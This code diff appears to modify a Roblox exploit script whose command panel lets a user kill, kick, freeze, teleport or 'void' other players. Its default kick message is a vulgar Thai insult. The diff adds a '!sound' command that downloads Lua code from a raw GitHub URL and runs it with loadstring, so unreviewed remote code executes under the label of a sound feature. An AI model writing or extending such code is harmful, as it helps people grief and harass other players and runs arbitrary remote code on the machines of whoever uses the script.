@@ -417,7 +417,7 @@ local function RunMainScript()
 
     local CmdSide = CreateSection(MasterFrame, UDim2.new(0, 250, 0.94, 0))
     local CTitle = Instance.new("TextLabel", CmdSide); CTitle.Size = UDim2.new(1,0,0,30); CTitle.Text = "COMMANDS"; CTitle.TextColor3 = Color3.fromRGB(255, 50, 50); CTitle.Font = Enum.Font.FredokaOne; CTitle.BackgroundTransparency = 1; CTitle.TextSize = 16
-    local HelpTxt = Instance.new("TextLabel", CmdSide); HelpTxt.Size = UDim2.new(1,0,0,100); HelpTxt.Position = UDim2.new(0,0,0,30); HelpTxt.Text = "!kill [n] | !kick [n] | !tp [n]\n!freeze [n] | !spin [n] | !void [n]\n!givevip [n] | !killall | !kickall"; HelpTxt.TextColor3 = Color3.fromRGB(180,180,180); HelpTxt.Font = Enum.Font.SourceSansBold; HelpTxt.TextSize = 11; HelpTxt.BackgroundTransparency = 1
+    local HelpTxt = Instance.new("TextLabel", CmdSide); HelpTxt.Size = UDim2.new(1,0,0,100); HelpTxt.Position = UDim2.new(0,0,0,30); HelpTxt.Text = "!kill [n] | !kick [n] | !tp [n]\n!freeze [n] | !spin [n] | !void [n]\n!givevip [n] | !killall | !kickall | !sound [n]"; HelpTxt.TextColor3 = Color3.fromRGB(180,180,180); HelpTxt.Font = Enum.Font.SourceSansBold; HelpTxt.TextSize = 11; HelpTxt.BackgroundTransparency = 1
     KickTextInp = Instance.new("TextBox", CmdSide); KickTextInp.Size = UDim2.new(1,0,0,25); KickTextInp.Position = UDim2.new(0,0,0,135); KickTextInp.Text = "โดนกูเตะไงไอ้ควาย"; KickTextInp.BackgroundColor3 = Color3.fromRGB(30,30,30); KickTextInp.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", KickTextInp)
     KickSoundInp = Instance.new("TextBox", CmdSide); KickSoundInp.Size = UDim2.new(1,0,0,25); KickSoundInp.Position = UDim2.new(0,0,0,165); KickSoundInp.Text = "rbxassetid://137337370812885"; KickSoundInp.BackgroundColor3 = Color3.fromRGB(30,30,30); KickSoundInp.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", KickSoundInp)
     local CmdBar = Instance.new("TextBox", CmdSide); CmdBar.Size = UDim2.new(1,0,0,35); CmdBar.Position = UDim2.new(0,0,1,-35); CmdBar.PlaceholderText = "> ENTER COMMAND..."; CmdBar.BackgroundColor3 = Color3.fromRGB(20,40,20); CmdBar.TextColor3 = Color3.fromRGB(0,255,0); Instance.new("UICorner", CmdBar)
@@ -529,6 +529,11 @@ local function RunMainScript()
             if cmd == "!void" then if target == "all" then for _,p in pairs(game.Players:GetPlayers()) do if p ~= speaker then VOID_TARGETS[p.Name] = true end end elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = true end end
             if cmd == "!unvoid" then if target == "all" then VOID_TARGETS = {} elseif typeof(target) == "Instance" then VOID_TARGETS[target.Name] = nil end end
             
+            -- [[ คำสั่ง !sound ที่เพิ่มเข้ามาใหม่ ]]
+            if cmd == "!sound" then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/%E0%B8%82%E0%B9%82%E0%B8%A1%E0%B8%A2%E0%B9%80%E0%B8%AA%E0%B8%B5%E0%B8%A2%E0%B8%87"))()
+            end
+
             if cmd == "!cmd" or cmd == "!givevip" then
                 if target == Player then
                     HAS_COMMAND_POWER[Player.Name] = true; CmdSide.Visible = true; UpdateBoard()
